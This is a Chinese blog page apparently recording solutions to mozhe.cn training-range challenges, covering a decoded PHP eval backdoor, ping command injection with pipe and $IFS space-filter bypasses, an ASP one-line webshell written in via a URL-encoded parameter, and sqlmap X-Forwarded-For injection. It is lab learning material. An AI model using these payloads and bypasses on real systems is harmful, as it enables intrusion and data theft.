@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.1.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=6.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.1.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="最近发现了一个不错的靶场，那个是最近出来的。里面的漏洞靶场对我来说可以涨挺多知识的。而且可能刚开始，里面的靶场很多都是免费的。做的听舒服的。也推荐一一下下：（https://www.mozhe.cn/）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mozhe 靶场做题记录">
+<meta property="og:url" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/index.html">
+<meta property="og:site_name" content="Ph3mf0lk">
+<meta property="og:description" content="最近发现了一个不错的靶场，那个是最近出来的。里面的漏洞靶场对我来说可以涨挺多知识的。而且可能刚开始，里面的靶场很多都是免费的。做的听舒服的。也推荐一一下下：（https://www.mozhe.cn/）">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/WMVQ8W%7D]9Z%60OIO$0RT~5KMT.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/U41BXO6EP9N%7DTK3OI8AU34U.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/J$$T%7BHWZ0_S3GGFZI%7B9YKEN.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/X9CE94[A%60[1V%W%7D1NFW[RB7.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/%7D_XGKY~Q%JH9F8R22C2JQLR.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/5.png">
+<meta property="og:updated_time" content="2018-05-09T13:53:27.835Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mozhe 靶场做题记录">
+<meta name="twitter:description" content="最近发现了一个不错的靶场，那个是最近出来的。里面的漏洞靶场对我来说可以涨挺多知识的。而且可能刚开始，里面的靶场很多都是免费的。做的听舒服的。也推荐一一下下：（https://www.mozhe.cn/）">
+<meta name="twitter:image" content="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/WMVQ8W%7D]9Z%60OIO$0RT~5KMT.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Ph3mf0lk" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>mozhe 靶场做题记录 | Ph3mf0lk</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/Sa1tf1sh" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> 
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ph3mf0lk</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+          
+  <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+</li>
+
+      
+        
+        
+          
+  <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+</li>
+
+      
+        
+        
+          
+  <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+</li>
+
+      
+        
+        
+          
+  <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+</li>
+
+      
+
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+</nav>
+
+
+  
+
+
+
+ </div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/08/mozhe-靶场做题记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Suenyu Den">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ph3mf0lk">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">mozhe 靶场做题记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-08T22:30:18+08:00">2018-05-08</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近发现了一个不错的靶场，那个是最近出来的。里面的漏洞靶场对我来说可以涨挺多知识的。而且可能刚开始，里面的靶场很多都是免费的。做的听舒服的。也推荐一一下下：（<a href="https://www.mozhe.cn/）" target="_blank" rel="noopener">https://www.mozhe.cn/）</a></p>
+<a id="more"></a>
+<h1 id="一、命令执行"><a href="#一、命令执行" class="headerlink" title="一、命令执行"></a>一、命令执行</h1><h2 id="1-titile-PHP代码分析溯源-第4题"><a href="#1-titile-PHP代码分析溯源-第4题" class="headerlink" title="1.titile:PHP代码分析溯源(第4题)"></a>1.titile:PHP代码分析溯源(第4题)</h2><p>背景介绍：</p>
+<p>小明收到一个网址，打开后是一串加密的代码。<br>小明需要你们的帮助，感受到时代在召唤了吗？</p>
+<p>实训目标：</p>
+<p>1.了解命令执行的基础知识;<br>2.学习php代码的相关知识;<br>3.了解加密解密的相关知识;</p>
+<p>进入题目，发现页面里有一串php代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">eval(gzinflate(base64_decode(&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>明显这个不符合php语法格式。所以我们把eval改成ehco再处理一下变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php echo </span><br><span class="line">gzinflate(base64_decode(&quot;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在本地运行，得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `$_REQUEST[a]`;; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>于是我们就可以用命令执行漏洞了。用?a=ls来查看所有目录文件。</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/WMVQ8W}]9Z`OIO$0RT~5KMT.png" alt="img"></p>
+<p>然后用?a=cat key_273223101616493.php就可以得到了flag–&gt;mozheca51564b14585838f9d323ac4e1</p>
+<p>注意：这里flag被注释掉了，查看源码即可。</p>
+<h2 id="2-title-命令注入执行分析"><a href="#2-title-命令注入执行分析" class="headerlink" title="2.title:命令注入执行分析"></a>2.title:命令注入执行分析</h2><p>背景介绍:</p>
+<p>某单位IT运维人员为了方便，在服务器上留了一个页面，用来ping内部服务器连通情况。安全工程师”墨者”在做月度检查时发现了这一文件，检查发现这一文件存在漏洞，要求运维人员立刻下线。</p>
+<p>实训目标:</p>
+<p>1、掌握Linux系统的基本命令；<br>2、了解Linux中管道符的作用；</p>
+<p>进去之后是一个让我们输入ip的输入框，明显是一个ping ip的操作。这个在最近的iscc里也有类似的题。然后用burp抓个包</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/U41BXO6EP9N}TK3OI8AU34U.png" alt="img"></p>
+<p>本来想像iscc那样用127.0.0.1%0als来列出所有文件名。可是并没有执行。</p>
+<p>于是去看了几篇命令执行漏洞的博文，例如（<a href="https://blog.csdn.net/qq_27446553/article/details/73927518）" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/73927518）</a></p>
+<p>试了&amp;，&amp;&amp;都不行，最后用了管道符|就可以了，||也可以。那么我们就ls</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/J$$T{HWZ0_S3GGFZI{9YKEN.png" alt="img"></p>
+<p>然后cat的时候发现空格被过滤。按照博文里的方法,我用了&lt;和<code>$IFS$9</code> 符号，${IFS}` 符号都可以绕过。</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/X9CE94[A`[1V%W}1NFW[RB7.png" alt="img"></p>
+<p>—&gt;通道符|:</p>
+<p>command 1|command 2</p>
+<p>把command1的输出做为command2的输入。command1的不会显示在屏幕上.注意：<br>1、管道命令只处理前一个命令正确输出，不处理错误输出<br>2、管道命令右边命令，必须能够接收标准输入流命令才行。</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps –ef |grep  python</span><br></pre></td></tr></table></figure>
+<p>Ps是linux中非常强大的进程查看工具，其中-e为显示所有进程，-f为全格式显示。</p>
+<p>Grep是一个非常高效的查询工具，可以查询文本中带有某关键字的行。</p>
+<p>这个命令的功能是，查询带有关键字 python 的进程。会一条一条列出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;</span><br><span class="line"></span><br><span class="line">&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &apos;1‘ &amp;&amp; echo &apos;2&apos;    </span><br><span class="line"></span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &apos;yes&apos; | wc -l</span><br><span class="line"></span><br><span class="line">|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;,$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</span><br></pre></td></tr></table></figure>
+<h1 id="二、SQL注入"><a href="#二、SQL注入" class="headerlink" title="二、SQL注入"></a>二、SQL注入</h1><h2 id="1-title-SQL注入实战-防注入-Access"><a href="#1-title-SQL注入实战-防注入-Access" class="headerlink" title="1.title: SQL注入实战(防注入)-Access"></a>1.title: SQL注入实战(防注入)-Access</h2><p>背景介绍：</p>
+<p>一套SQL通用asp防注入脚本</p>
+<p>实训目标：</p>
+<p>1、了解sql注入的基本原理。<br>2、了解一句话木马的使用。<br>3、了解一句话的加密使用。<br>4、了解基本的信息收集。</p>
+<p>进入这个题目，它说记录好像写到数据库文件里面了，于是我们可以尝试写入一句话木马来getshell.有个id参数，我们加上单引号,弹窗：</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/}_XGKY~Q%JH9F8R22C2JQLR.png" alt="img"></p>
+<p>随后我们发现我们的1‘被写入到数据库中了</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/1.png" alt="img"></p>
+<p>于是我们尝试直接写入一句话木马，发现提交数据为空，说明有被过滤。于是我们进行编码一下，就提交成功了，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47667/news.asp?id=%3C%25eval%20request%28%22ccccc%22%29%25%3E</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/2.png" alt="img"></p>
+<p>然后通过搜索引擎找到该记录文件为目录下的sqlin.asp。用菜刀连接即可。</p>
+<p>坑点：这里得用IE浏览器，我用了火狐和chorme都不行，即使传进去了，但是浏览器自动给你Unicode编码，造成一句马被编码了，菜刀无法连接。后来用了ie就可以。</p>
+<h2 id="2-title-X-Forwarded-For注入漏洞实战"><a href="#2-title-X-Forwarded-For注入漏洞实战" class="headerlink" title="2.title:X-Forwarded-For注入漏洞实战"></a>2.title:X-Forwarded-For注入漏洞实战</h2><p>背景介绍:</p>
+<p>某业务系统，安全工程师”墨者”进行授权黑盒测试，系统的业主单位也没有给账号密码，怎么测？</p>
+<p>实训目标：</p>
+<p>1、掌握SQL注入的基本原理；<br>2、了解服务器获取客户端IP的方式；<br>3、了解SQL注入的工具使用；</p>
+<p>这题让我又学会了一种sqlmap的用法.</p>
+<p>进入题目，是一个登陆框。我们先用admin，admin登陆，然后发现</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/3.png" alt="img"></p>
+<p>发现这里记录了我电脑的ip。那么就可以想到这里的注入点是XFF。看了一篇关于http头注入的文章。然后用burp抓包，添加一个XFF，在ip后加个“<em>”号，作用是sqlmqp会自动查找注入点，插入“</em>”可引导sqlmap。然后把请求copy下来保存为一个txt文件</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/6.png" alt="img"></p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/4.png" alt="img"></p>
+<p>然后就开启我们的神器sqlmap，输入命令sqlmap.py -r “C:\Users\XXX\Desktop\request.txt” -p “X-Forwarded-For” –dbs 就可以爆库。</p>
+<p><img src="/2018/05/08/mozhe-靶场做题记录/5.png" alt="img"></p>
+<p>然后以此类推就可以爆出表名，字段，数据了。进而就可以知道账号密码了.</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+	
+	
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/30/discuz7-2-faq-php注入漏洞/" rel="next" title="discuz7.2 faq.php注入漏洞">
+                <i class="fa fa-chevron-left"></i> discuz7.2 faq.php注入漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/13/第四届全国网络空间安全技术大赛wp/" rel="prev" title="第四届全国网络空间安全技术大赛wp">
+                第四届全国网络空间安全技术大赛wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Suenyu Den" />
+            
+              <p class="site-author-name" itemprop="name">Suenyu Den</p>
+              <p class="site-description motion-element" itemprop="description">quite and calm!!!!</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一、命令执行"><span class="nav-number">1.</span> <span class="nav-text">一、命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-titile-PHP代码分析溯源-第4题"><span class="nav-number">1.1.</span> <span class="nav-text">1.titile:PHP代码分析溯源(第4题)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-title-命令注入执行分析"><span class="nav-number">1.2.</span> <span class="nav-text">2.title:命令注入执行分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二、SQL注入"><span class="nav-number">2.</span> <span class="nav-text">二、SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-title-SQL注入实战-防注入-Access"><span class="nav-number">2.1.</span> <span class="nav-text">1.title: SQL注入实战(防注入)-Access</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-title-X-Forwarded-For注入漏洞实战"><span class="nav-number">2.2.</span> <span class="nav-text">2.title:X-Forwarded-For注入漏洞实战</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate"> 
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Suenyu Den</span>
+
+  
+
+  
+</div>
+
+
+
+
+   <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+   
+   
+<!--  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/theme-next/hexo-theme-next">NexT.Mist</a> v6.1.0</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.1.0"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
